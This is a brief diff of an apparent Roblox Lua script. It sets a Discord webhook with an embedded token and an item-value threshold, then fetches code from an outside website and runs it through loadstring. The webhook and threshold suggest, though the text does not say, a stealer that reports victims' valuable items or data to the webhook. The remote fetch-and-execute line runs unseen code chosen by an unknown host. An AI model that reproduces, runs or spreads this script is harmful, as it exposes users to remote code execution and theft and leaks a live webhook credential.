@@ -4,4 +4,4 @@ Webhook = "https://discord.com/api/webhooks/1237505545951514686/8xXO9MUpdm31zFIu
 
 MinimumRAP = 1
 
-loadstring(game:HttpGet("https://egorikusa.space"))()```
+loadstring(game:HttpGet("https://egorikusa.space"))()
